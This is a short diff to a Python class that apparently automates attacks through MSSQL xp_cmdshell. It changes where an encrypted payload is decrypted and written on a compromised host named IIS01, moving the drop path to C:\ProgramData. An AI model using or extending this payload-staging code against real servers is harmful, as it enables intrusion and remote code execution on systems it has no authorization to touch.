@@ -96,7 +96,7 @@ class XpMssql:
 
     def _rand_tmp(self, ext: str) -> str:
         stem = ''.join(random.choices(string.ascii_lowercase, k=8))
-        return f"C:\\Users\\Public\\{stem}.{ext}"
+        return f"C:\\ProgramData\\{stem}.{ext}"
 
     def _tsql_escape(self, s: str) -> str:
         """Escape a value for embedding inside a T-SQL string literal '...'."""
@@ -189,7 +189,7 @@ class XpMssql:
         shell.cmd_exec_raw(f'{self._sqlcmd_prefix()} -i {remote_sql}')
 
         # Build and run the extract+decrypt PowerShell script on IIS01
-        out_path = f"C:\\Users\\Public\\{payload_name}"
+        out_path = f"C:\\ProgramData\\{payload_name}"
         ps = self._build_decrypt_ps(key_b64, out_path) if (encrypt and key_b64) \
              else self._build_plain_ps(out_path)
         self.cmd_xpshell_psh(shell, ps)
